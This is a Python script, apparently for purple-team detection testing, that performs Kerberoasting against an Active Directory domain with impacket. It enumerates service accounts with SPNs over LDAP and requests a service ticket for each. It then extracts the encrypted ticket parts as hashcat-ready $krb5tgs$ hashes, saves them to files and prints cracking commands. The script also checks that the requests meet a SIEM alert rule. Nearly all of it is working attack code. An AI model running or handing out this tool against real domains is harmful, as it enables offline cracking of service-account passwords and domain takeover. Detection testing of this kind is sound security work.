#!/usr/bin/env python3
"""
Kerberoasting Detection Test — impacket GetUserSPNs edition
  • Enumerates kerberoastable accounts via impacket native LDAP (no ldap3)
  • Each TGS-REQ fires Event ID 4769  +  'Application Kerberos Session Opened'
  • Hashes extracted from TGS enc-part and saved per account + combined
"""

import getpass
import logging
import os
import socket
import sys
import time
from binascii import hexlify
from datetime import datetime
from pathlib import Path

# ── optional DNS ──────────────────────────────────────────────────────────────
try:
    import dns.resolver as _dns
    HAS_DNS = True
except ImportError:
    HAS_DNS = False

# ── impacket only — no ldap3 ─────────────────────────────────────────────────
try:
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import TGS_REP
    from impacket.krb5.ccache import CCache
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5.types import Principal
    from impacket.ldap import ldap as impacket_ldap
    from impacket.ldap import ldapasn1 as impacket_ldapasn1
    from pyasn1.codec.ber import decoder as asn1decoder
except ImportError as e:
    print(f"[!] Missing dependency: {e}")
    print("[!] pip install impacket pyasn1")
    sys.exit(1)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-8s  %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("kerberoast-test")

# ── constants ─────────────────────────────────────────────────────────────────
MAX_ACCOUNTS   = 5       # hard cap on kerberoastable accounts to target
DELAY          = 2       # seconds between TGS requests
TCP_TIMEOUT    = 10      # socket timeout
RETRY_ATTEMPTS = 3
RETRY_BACKOFF  = 2


# ─────────────────────────────────────────────────────────────────────────────
# DATA CLASS
# ─────────────────────────────────────────────────────────────────────────────

class SPNRecord:
    """
    One kerberoastable account discovered via LDAP.
    May have multiple SPNs — we try each until one succeeds.
    """
    def __init__(self, sam_account: str, spns: list[str], domain: str):
        self.sam_account = sam_account   # sAMAccountName  e.g. svc_mssql
        self.spns        = spns          # all SPNs for this account
        self.domain      = domain

    def __repr__(self):
        return f"SPNRecord({self.sam_account!r}, spns={self.spns})"


# ─────────────────────────────────────────────────────────────────────────────
# HASH EXTRACTION
# Every TGS-REP contains a ticket whose enc-part holds the crackable material.
# We parse that enc-part and format it for hashcat / john.
# ─────────────────────────────────────────────────────────────────────────────

ETYPE_NAMES = {
    17: "AES-128  (hashcat -m 19600)",
    18: "AES-256  (hashcat -m 19700)",
    23: "RC4-HMAC (hashcat -m 13100)",
}

HASHCAT_MODES = {17: 19600, 18: 19700, 23: 13100}


def extract_hash(tgs, username: str, domain: str, spn: str) -> str:
    """
    Parse TGS-REP (decoded pyasn1 object or raw bytes — handled either way).
    Returns a hashcat-compatible $krb5tgs$ string.

    Formats:
      RC4  (etype 23):  $krb5tgs$23$*user$DOMAIN$spn*$<16B checksum hex>$<rest hex>
      AES  (etype 17/18): $krb5tgs$<etype>$user$DOMAIN$*spn*$<16B hex>$<rest hex>

    The first 16 bytes of the ticket enc-part cipher are the HMAC checksum;
    everything after is the ciphertext — this is what hashcat attacks.
    """
    try:
        # tgs can be an already-decoded pyasn1 object (impacket standard)
        # or raw bytes from an older build — handle both
        try:
            enc_part = tgs['ticket']['enc-part']
        except Exception:
            decoded  = asn1decoder.decode(bytes(tgs), asn1Spec=TGS_REP())[0]
            enc_part = decoded['ticket']['enc-part']

        etype   = int(enc_part['etype'])
        cipher  = enc_part['cipher'].asOctets()
        chk_hex = hexlify(cipher[:16]).decode()   # HMAC checksum
        dat_hex = hexlify(cipher[16:]).decode()   # encrypted payload

        log.info(f"[HASH] etype={etype} ({ETYPE_NAMES.get(etype, 'unknown')})")

        # RC4-HMAC — weakest, most commonly kerberoastable
        if etype == constants.EncryptionTypes.rc4_hmac.value:          # 23
            return f"$krb5tgs${etype}$*{username}${domain}${spn}*${chk_hex}${dat_hex}"

        # AES-128 / AES-256 — hashcat still cracks these, just slower
        return f"$krb5tgs${etype}${username}${domain}$*{spn}*${chk_hex}${dat_hex}"

    except Exception as e:
        log.warning(f"[HASH] Could not extract hash for {username}: {e}")
        return ""


def save_hashes(account_hashes: dict[str, dict], run_ts: str):
    """
    Save hashes organised by account.

    Layout:
        kerberoast_hashes/
            <run_timestamp>/
                <account>.txt      ← one file per account with metadata header
                all_hashes.txt     ← bare hashes combined for hashcat
    """
    has_any = any(v.get("hash") for v in account_hashes.values())
    if not has_any:
        log.warning("[HASH] No hashes extracted — nothing to save")
        return

    out_dir = Path("kerberoast_hashes") / run_ts
    out_dir.mkdir(parents=True, exist_ok=True)

    all_lines: list[str] = []

    for account, info in account_hashes.items():
        hash_str = info.get("hash", "")
        if not hash_str:
            continue

        spn   = info.get("spn",   "unknown")
        etype = info.get("etype", 0)
        mode  = HASHCAT_MODES.get(etype, "?")

        # Per-account file — includes metadata for context
        acct_file = out_dir / f"{account}.txt"
        acct_file.write_text(
            f"# Account : {account}\n"
            f"# Domain  : {info.get('domain', '')}\n"
            f"# SPN     : {spn}\n"
            f"# Etype   : {etype}  ({ETYPE_NAMES.get(etype, 'unknown')})\n"
            f"# Mode    : hashcat -m {mode} <file> <wordlist>\n"
            f"# Time    : {datetime.now().isoformat()}\n"
            f"{hash_str}\n"
        )
        log.info(f"[HASH] Saved → {acct_file}")
        all_lines.append(hash_str)

    # Combined file — bare hashes, no comments, ready for hashcat
    all_file = out_dir / "all_hashes.txt"
    all_file.write_text("\n".join(all_lines) + "\n")
    log.info(f"[HASH] Combined → {all_file}  ({len(all_lines)} hash(es))")

    # Print crack commands
    etypes_found = {v.get("etype") for v in account_hashes.values() if v.get("etype")}
    print(f"\n  Hash files : {out_dir}/")
    print(f"  Crack with hashcat:")
    for et in sorted(etypes_found):
        mode = HASHCAT_MODES.get(et, "?")
        print(f"    {ETYPE_NAMES.get(et, f'etype {et}'):40s}  "
              f"hashcat -m {mode} {all_file} wordlist.txt")


# ─────────────────────────────────────────────────────────────────────────────
# RETRY WRAPPER
# ─────────────────────────────────────────────────────────────────────────────

def with_retry(fn, label: str):
    """Run fn() up to RETRY_ATTEMPTS times with backoff. Returns None on total failure."""
    for attempt in range(1, RETRY_ATTEMPTS + 1):
        try:
            return fn()
        except Exception as e:
            if attempt < RETRY_ATTEMPTS:
                log.warning(
                    f"[RETRY] {label} attempt {attempt}/{RETRY_ATTEMPTS} "
                    f"failed: {e} — retrying in {RETRY_BACKOFF}s"
                )
                time.sleep(RETRY_BACKOFF)
            else:
                log.warning(f"[RETRY] {label} all {RETRY_ATTEMPTS} attempts failed: {e}")
    return None


# ─────────────────────────────────────────────────────────────────────────────
# ENVIRONMENT DISCOVERY
# ─────────────────────────────────────────────────────────────────────────────

def discover_username() -> str:
    for var in ("USERNAME", "USER", "LOGNAME"):
        val = os.environ.get(var, "").strip()
        if val:
            log.info(f"[ENV]  Username: {val}")
            return val
    return getpass.getuser()


def discover_domain() -> str:
    for var in ("USERDNSDOMAIN", "USERDOMAIN"):
        val = os.environ.get(var, "").strip()
        if val and "." in val:
            log.info(f"[ENV]  Domain: {val.upper()}")
            return val.upper()
    try:
        fqdn = socket.getfqdn()
        if "." in fqdn:
            domain = fqdn.split(".", 1)[1].upper()
            log.info(f"[ENV]  Domain from FQDN: {domain}")
            return domain
    except Exception:
        pass
    return ""


# ─────────────────────────────────────────────────────────────────────────────
# KDC DISCOVERY + REACHABILITY
# ─────────────────────────────────────────────────────────────────────────────

def discover_kdc_hosts(domain: str) -> list[str]:
    hosts: list[str] = []
    if HAS_DNS:
        try:
            answers = sorted(
                _dns.resolve(f"_kerberos._tcp.{domain}", "SRV"),
                key=lambda r: (r.priority, r.weight),
            )
            for rr in answers:
                host = str(rr.target).rstrip(".")
                hosts.append(host)
                log.info(f"[DNS]  KDC via SRV: {host}  (priority={rr.priority})")
        except Exception as e:
            log.warning(f"[DNS]  SRV lookup failed: {e}")
    if not hosts:
        log.info(f"[DNS]  Falling back to domain name: {domain}")
        hosts.append(domain)
    return hosts


def resolve_all_ips(host: str) -> list[str]:
    try:
        results = socket.getaddrinfo(host, None, socket.AF_INET)
        ips = list(dict.fromkeys(r[4][0] for r in results))
        log.info(f"[DNS]  {host} → {ips}")
        return ips
    except socket.gaierror as e:
        log.warning(f"[DNS]  Cannot resolve {host}: {e}")
        return []


def check_tcp88(ip: str) -> bool:
    try:
        with socket.create_connection((ip, 88), timeout=TCP_TIMEOUT):
            log.info(f"[NET]  TCP/88 reachable on {ip}  ✓")
            return True
    except socket.timeout:
        log.warning(f"[NET]  TCP/88 timed out on {ip}")
    except (ConnectionRefusedError, OSError) as e:
        log.warning(f"[NET]  TCP/88 error on {ip}: {e}")
    return False


def check_udp88(ip: str) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(TCP_TIMEOUT)
        sock.sendto(b"\x6a\x00", (ip, 88))
        sock.recv(32)
        sock.close()
        log.info(f"[NET]  UDP/88 reachable on {ip}  ✓")
        return True
    except (socket.timeout, OSError) as e:
        log.warning(f"[NET]  UDP/88 unreachable on {ip}: {e}")
    return False


def find_reachable_kdc(domain: str) -> str | None:
    for host in discover_kdc_hosts(domain):
        ips = resolve_all_ips(host) or [host]
        for ip in ips:
            if check_tcp88(ip):
                return ip
            log.info(f"[NET]  Trying UDP/88 on {ip} …")
            if check_udp88(ip):
                return ip
    return None


# ─────────────────────────────────────────────────────────────────────────────
# LDAP — impacket native (mirrors GetUserSPNs.py internals exactly)
# No ldap3 required — impacket ships its own LDAP stack
# ─────────────────────────────────────────────────────────────────────────────

def ldap_base_dn(domain: str) -> str:
    return ",".join(f"DC={p}" for p in domain.split("."))


def impacket_ldap_connect(dc_ip: str, domain: str,
                           username: str, password: str,
                           lmhash: str = "", nthash: str = ""):
    """
    Connect via impacket's LDAPConnection.
    Tries LDAP (389) → LDAPS (636) automatically.
    Uses NTLM (sicilyNegotiate) — works on modern DCs with signing enforced.
    """
    base_dn = ldap_base_dn(domain)

    for scheme in ("ldap", "ldaps"):
        url = f"{scheme}://{dc_ip}"
        try:
            log.info(f"[LDAP] Trying {scheme.upper()}://{dc_ip}  as  {domain}\\{username}")
            conn = impacket_ldap.LDAPConnection(url, base_dn, dc_ip)
            conn.login(username, password, domain, lmhash, nthash)
            log.info(f"[LDAP] Connected via {scheme.upper()}  ✓")
            return conn
        except impacket_ldap.LDAPSessionError as e:
            log.warning(f"[LDAP] {scheme.upper()} session error: {e}")
        except Exception as e:
            log.warning(f"[LDAP] {scheme.upper()} error: {e}")

    return None


def passes_alert_filter(spn: str, svc_class: str, requesting_user: str) -> bool:
    """
    Mirror the SIEM alert rule exactly:
        service name != krbtgt
        service name does not contain $
        service name != requesting account name
    """
    if svc_class == "krbtgt":
        return False
    if "$" in svc_class:
        return False
    if svc_class == requesting_user.lower():
        return False
    return True


def enumerate_spns(dc_ip: str, domain: str,
                   username: str, password: str,
                   requesting_user: str) -> list[SPNRecord]:
    """
    Replicates impacket GetUserSPNs LDAP query verbatim.
    Returns kerberoastable accounts that also pass alert conditions.
    """
    conn = impacket_ldap_connect(dc_ip, domain, username, password)
    if conn is None:
        log.error(
            "[LDAP] All connection attempts failed.\n"
            "  Causes: DC blocking LDAP, wrong credentials, firewall on 389/636"
        )
        sys.exit(1)

    # Exact same filter as impacket GetUserSPNs.py
    spn_filter = (
        "(&(servicePrincipalName=*)"
        "(UserAccountControl:1.2.840.113556.1.4.803:=512)"    # normal user
        "(!(UserAccountControl:1.2.840.113556.1.4.803:=2))"   # not disabled
        "(!(objectCategory=computer)))"                        # not computer
    )

    attributes = [
        "sAMAccountName",
        "servicePrincipalName",
        "memberOf",
        "pwdLastSet",
        "userAccountControl",
    ]

    log.info("[LDAP] Querying for kerberoastable accounts …")

    try:
        # Fetch more than MAX_ACCOUNTS to allow for filtering
        resp = conn.search(
            searchFilter = spn_filter,
            attributes   = attributes,
            sizeLimit    = MAX_ACCOUNTS * 4,
        )
    except Exception as e:
        # Some DCs reject non-zero sizeLimit — retry without it
        log.warning(f"[LDAP] Search with sizeLimit failed ({e}) — retrying unlimited")
        try:
            resp = conn.search(searchFilter=spn_filter, attributes=attributes)
        except Exception as e2:
            log.error(f"[LDAP] Search failed: {e2}")
            sys.exit(1)

    records: list[SPNRecord] = []

    for item in resp:
        # Only process actual result entries
        if not isinstance(item, impacket_ldapasn1.SearchResultEntry):
            continue

        try:
            sam  = None
            spns = []

            for attr in item['attributes']:
                attr_name = str(attr['type'])

                if attr_name == 'sAMAccountName':
                    sam = str(attr['vals'][0])

                elif attr_name == 'servicePrincipalName':
                    for val in attr['vals']:
                        spns.append(str(val))

            if not sam or not spns:
                continue

            # Apply alert condition filter to each SPN
            accepted_spns: list[str] = []
            for spn in spns:
                # Service class is the part before the first /
                svc = spn.split("/")[0].lower() if "/" in spn else spn.lower()
                if passes_alert_filter(spn, svc, requesting_user):
                    accepted_spns.append(spn)
                else:
                    log.info(f"[SKIP] {sam} → {spn}  (fails alert filter)")

            if not accepted_spns:
                log.info(f"[SKIP] {sam}: all SPNs filtered out")
                continue

            records.append(SPNRecord(sam, accepted_spns, domain))
            log.info(f"[LDAP] Accepted: {sam}  ({len(accepted_spns)} SPN(s))")
            for spn in accepted_spns:
                log.info(f"         SPN: {spn}")

            if len(records) >= MAX_ACCOUNTS:
                log.info(f"[LDAP] Reached cap of {MAX_ACCOUNTS} accounts")
                break

        except Exception as e:
            log.warning(f"[LDAP] Error parsing entry: {e}")
            continue

    try:
        conn.close()
    except Exception:
        pass

    log.info(f"[LDAP] Found {len(records)} kerberoastable account(s)")
    return records


# ─────────────────────────────────────────────────────────────────────────────
# KERBEROS — TGT + per-account TGS
# ─────────────────────────────────────────────────────────────────────────────

def tgt_from_ccache(domain: str):
    """Reuse an existing TGT from KRB5CCNAME (Linux/kinit)."""
    path = os.environ.get("KRB5CCNAME", "").replace("FILE:", "")
    if not path or not os.path.exists(path):
        return None
    try:
        cc = CCache.loadFile(path)
        for cred in cc.credentials:
            try:
                if "krbtgt" in cred["server"].prettyPrint().lower():
                    d = cred.toTGT()
                    log.info(f"[KRB5] Reusing TGT from {path}  ✓  (no password needed)")
                    return d["KDC_REP"], d["cipher"], d["oldSessionKey"], d["sessionKey"]
            except Exception:
                continue
    except Exception as e:
        log.warning(f"[KRB5] ccache load failed: {e}")
    return None


def get_tgt(username: str, password: str, domain: str, dc_ip: str):
    cached = tgt_from_ccache(domain)
    if cached:
        return cached

    def _request():
        log.info(f"[AS-REQ] Requesting TGT for {username}@{domain}")
        upn = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        return getKerberosTGT(upn, password, domain, "", "", "", dc_ip)

    result = with_retry(_request, "AS-REQ (TGT)")
    if result is None:
        return None
    tgt, cipher, old_sk, sk = result
    log.info("[AS-REP] TGT obtained  ✓")
    return tgt, cipher, old_sk, sk


def tgs_for_account(tgt, cipher, old_sk, sk,
                     record: SPNRecord, dc_ip: str) -> tuple[str, object]:
    """
    Try each SPN registered for this account until one succeeds.
    Returns (spn_used, tgs_object) or (first_spn, None) on total failure.

    Why try multiple SPNs per account?
    An account may have several SPNs registered but only some have matching
    keys on the DC. We stop at the first success.
    """
    for spn in record.spns:
        def _request(s=spn):
            svc = Principal(s, type=constants.PrincipalNameType.NT_SRV_INST.value)
            return getKerberosTGS(svc, record.domain, dc_ip, tgt, cipher, sk)

        result = with_retry(_request, f"TGS-REQ ({spn})")
        if result is not None:
            tgs, _, _, _ = result
            log.info(f"[TGS-REP] ✓  {spn}  →  Event 4769 generated on DC")
            return spn, tgs

        log.warning(f"[TGS-REP] ✗  {spn}  — trying next SPN for {record.sam_account}")

    return record.spns[0], None


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────

def main():
    run_ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    print("\n── Kerberoasting Detection Test (impacket GetUserSPNs) ──\n")

    # 1. Identity + domain
    username = discover_username()
    domain   = discover_domain()

    if not domain:
        log.error("Domain not found — set $USERDNSDOMAIN or join to domain")
        sys.exit(1)

    # 2. Find a live KDC (TCP → UDP fallback, all SRV records tried)
    dc_ip = find_reachable_kdc(domain)
    if not dc_ip:
        log.error(
            "No reachable KDC on TCP or UDP port 88.\n"
            "  • Firewall blocking port 88?\n"
            "  • Not on domain network / no VPN?\n"
            f"  Try: nslookup -type=SRV _kerberos._tcp.{domain}"
        )
        sys.exit(1)

    # 3. Password — ccache reuse skips this on Linux
    if os.environ.get("KRB5CCNAME"):
        log.info("[AUTH] KRB5CCNAME set — trying cached TGT first")
        password = ""
    else:
        print(
            "\n[NOTE] Password used for:\n"
            "        1. LDAP bind  → enumerate SPNs from AD\n"
            "        2. AS-REQ     → obtain your TGT from the KDC\n"
            "       Not stored. Not sent anywhere except your own DC.\n"
        )
        password = getpass.getpass(f"Password for {username}@{domain}: ")

    # 4. Enumerate kerberoastable accounts via impacket LDAP
    print()
    records = enumerate_spns(dc_ip, domain, username, password, username)

    if not records:
        log.error(
            "No kerberoastable accounts found.\n"
            "  • No accounts with SPNs in AD?\n"
            "  • LDAP enumeration blocked by firewall/policy?\n"
            "  • All SPNs belong to disabled / computer accounts?"
        )
        sys.exit(1)

    # 5. Plan
    sep = "=" * 66
    print(f"\n{sep}")
    print(f"  Domain    : {domain}")
    print(f"  User      : {username}@{domain}")
    print(f"  KDC       : {dc_ip}")
    print(f"  Targets   : {len(records)} account(s)")
    for r in records:
        print(f"              → {r.sam_account}")
        for spn in r.spns:
            print(f"                SPN: {spn}")
    print(f"\n  Each TGS-REQ fires on the DC:")
    print(f"    Event ID       : 4769  (Kerberos Service Ticket Operations)")
    print(f"    Event Category : Application Kerberos Session Opened")
    print(f"                     (SIEM label applied on ingest of raw 4769)")
    print(f"  Hashes output  : ./kerberoast_hashes/{run_ts}/")
    print(f"{sep}\n")

    # 6. Get TGT once — reused for all accounts
    tgt_result = get_tgt(username, password, domain, dc_ip)
    if tgt_result is None:
        log.error(
            "Could not obtain TGT.\n"
            "  • Wrong password?\n"
            "  • Account locked / disabled?\n"
            "  • Clock skew > 5 minutes?  (Kerberos hard requirement)\n"
            "  • DC unreachable after retries?"
        )
        sys.exit(1)

    tgt, cipher, old_sk, sk = tgt_result

    # 7. TGS-REQ per account → Event 4769, extract hash
    # Structure: { sam_account: { hash, spn, etype, domain } }
    account_hashes: dict[str, dict] = {}
    results:        dict[str, bool] = {}

    for i, record in enumerate(records, 1):
        log.info(f"\n── Account {i}/{len(records)}: {record.sam_account}")

        spn_used, tgs = tgs_for_account(tgt, cipher, old_sk, sk, record, dc_ip)

        if tgs is not None:
            results[record.sam_account] = True

            # Extract hash from TGS enc-part
            hash_str = extract_hash(tgs, record.sam_account, domain, spn_used)

            # Determine etype for file metadata
            try:
                enc = tgs['ticket']['enc-part']
                etype = int(enc['etype'])
            except Exception:
                etype = 0

            account_hashes[record.sam_account] = {
                "hash":   hash_str,
                "spn":    spn_used,
                "etype":  etype,
                "domain": domain,
            }

            if hash_str:
                # Print first 80 chars so the user can verify format
                log.info(f"[HASH] {hash_str[:80]}…")
            else:
                log.warning(f"[HASH] TGS received but hash extraction failed for "
                             f"{record.sam_account}")
        else:
            results[record.sam_account]        = False
            account_hashes[record.sam_account] = {"hash": "", "spn": spn_used,
                                                   "etype": 0, "domain": domain}

        if i < len(records):
            time.sleep(DELAY)

    # 8. Save all hashes
    save_hashes(account_hashes, run_ts)

    # 9. Summary
    ok  = [a for a, r in results.items() if r]
    nok = [a for a, r in results.items() if not r]

    print(f"\n{sep}")
    print(" RESULTS")
    print(sep)
    for a in ok:
        spn = account_hashes[a].get("spn", "")
        et  = account_hashes[a].get("etype", 0)
        print(f"  ✓  {a:<30s}  SPN: {spn}  etype: {et}")
    for a in nok:
        print(f"  ✗  {a}")

    hashed = sum(1 for v in account_hashes.values() if v.get("hash"))
    print(f"\n  Tickets received    : {len(ok)}/{len(records)}")
    print(f"  Hashes extracted    : {hashed}/{len(ok)}")
    print(f"  Alert should fire   : {'YES ✓' if len(ok) >= 3 else 'NO — need >= 3'}")

    if ok:
        print(f"\n  Every fired event satisfies:")
        print(f"    Windows Event ID 4769             ✓")
        print(f"    Category: Session Opened          ✓  (SIEM on ingest)")
        print(f"    Account name  !=  Service name    ✓")
        print(f"    Service name  !=  krbtgt          ✓")
        print(f"    Service name  contains no $       ✓")

    if nok:
        print(f"\n  Failed accounts:")
        print(f"    KDC_ERR_S_PRINCIPAL_UNKNOWN → SPN registered but no keys on DC")
        print(f"    KDC_ERR_ETYPE_NOSUPP        → encryption type unsupported")
        print(f"    Try: Get-ADUser {nok[0]} -Properties ServicePrincipalName")

    print(f"{sep}\n")


if __name__ == "__main__":
    main()
